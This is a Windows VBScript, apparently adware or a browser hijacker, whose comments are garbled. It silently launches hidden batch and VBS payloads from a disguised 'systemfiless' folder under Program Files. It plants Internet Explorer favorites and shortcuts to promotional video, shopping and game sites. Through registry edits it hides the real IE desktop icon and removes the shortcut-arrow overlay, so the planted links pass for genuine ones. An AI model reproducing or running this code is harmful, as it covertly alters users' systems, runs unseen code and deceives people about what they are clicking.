Dim WSHShell 
Set WshShell = WScript.CreateObject("WScript.Shell")
strDesktop = WshShell.SpecialFolders("Desktop") :'�����ļ��С����桱
Favorites = WshShell.SpecialFolders("Favorites") :'�����ļ��С����桱
on error resume next 

strttWinDir = WshShell.ExpandEnvironmentStrings("%ProgramFiles%")
createobject("wscript.shell").run """"&strttWinDir&"\systemfiless\3.bat""",0


Rem 

Set oShellLink = WshShell.CreateShortcut(Favorites & "\ǧǧ��������ֱ��.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink.Arguments = "http://77"&"zb.com/?fav" :'����
oShellLink.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3�����7��С��
oShellLink.IconLocation = "%ProgramFiles%\system"&"filess\77"&"zb.ico, 0" : 'ͼ��
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink.Save : '���������ݷ�ʽ
Set oShellLink = WshShell.CreateShortcut(Favorites & "\��Ʒ�����������.lnk")
oShellLink.TargetPath = "%ProgramFiles%\Internet Explorer\iexplore.exe" : 'Ŀ��
oShellLink.Arguments = "http://www.9ptv.com/?fav" :'����
oShellLink.WindowStyle = 1 :'����1Ĭ�ϴ��ڼ������3��7��С��
oShellLink.IconLocation = "%ProgramFiles%\systemfiless\9ptv.ico, 0" : 'ͼ��
oShellLink.WorkingDirectory = "%ProgramFiles%\Internet Explorer\" : '��ʼλ��
oShellLink.Save : '���������ݷ�ʽ

createobject("wscript.shell").run """"&strttWinDir&"\system"&""&"filess\3.vbs""",0
Rem 
RegPath="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\NewStartPanel\{871C5380-42A0-1069-A2EA-08002B30309D}"
RegPath1="HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\HideDesktopIcons\ClassicStartMenu\{871C5380-42A0-1069-A2EA-08002B30309D}"
Type_Name="REG_DWORD"
Key_Data=1
WshShell.RegWrite RegPath,Key_Data,Type_Name
WshShell.RegWrite RegPath1,Key_Data,Type_Name
Set WSHShell = WScript.CreateObject("WScript.Shell") 
strDesktop = WSHShell.SpecialFolders("Desktop") 
WSHShell.AppActivate strDesktop 
WSHShell.SendKeys "{F5}" 


Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�Ա��� - �ԣ���ϲ��.url")
oUrlLink.TargetPath = "http://www.82vv.com/tb/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\45575����С��Ϸ����������ĳ���С��Ϸ.url")
oUrlLink.TargetPath = "http://www.45575.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�����������Ϲ������ģ�ͼ�顢ĸӤ����ױ���Ҿӡ����롢�ҵ硢��װ��Ь���ȣ���Ʒ�ͼۣ���������.url")
oUrlLink.TargetPath = "http://www.82vv.com/dd/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\׿Խ����ѷ���Ϲ���ͼ�飬�ֻ������룬�ҵ磬��ױƷ���ӱ����ε���������.url")
oUrlLink.TargetPath = "http://www.82vv.com/zy/"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�������Ӿ磬������õ���ɫ������ѵ��Ӿ���վ.url")
oUrlLink.TargetPath = "http://www.kkdsj.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\������ɫ��Ʒ��ѵ�Ӱ�����ٸ��壡������£�����.url")
oUrlLink.TargetPath = "http://www.kuku46.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�崿��Ʒ����д�棡����ͼ�󼯺ϣ�.url")
oUrlLink.TargetPath = "http://www.ysr3.com/?fav"
oUrlLink.Save
Set oUrlLink = WshShell.CreateShortcut(Favorites & "\�����������С˵�Ķ������ٶȿ����ݷḻ������.url")
oUrlLink.TargetPath = "http://www.bookxp.com/?fav"
oUrlLink.Save
'=========


WSHShell.RegDelete "HKCR\InternetShortcut\IsShortcut"
wscript.quit